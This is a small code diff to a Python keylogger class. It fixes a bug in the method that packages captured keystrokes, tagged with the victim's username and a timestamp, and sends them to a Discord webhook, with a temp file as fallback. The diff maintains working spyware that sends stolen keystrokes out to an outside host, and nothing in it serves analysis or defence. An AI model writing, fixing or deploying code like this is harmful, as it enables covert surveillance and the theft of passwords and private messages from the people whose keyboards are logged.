@@ -31,8 +31,10 @@ class Keylogger:
         self.log += name
 
     def report_to_webhook(self):
+        flag = False
         webhook = DiscordWebhook(url=WEBHOOK)
         if len(self.log) > 2000:
+            flag = True
             path = os.environ["temp"] + "\\report.txt"
             with open(path, 'w+') as file:
                 file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
@@ -43,7 +45,8 @@ class Keylogger:
             embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
             webhook.add_embed(embed)    
         webhook.execute()
-        os.remove(path)
+        if flag:
+            os.remove(path)
 
     def report(self):
         if self.log:
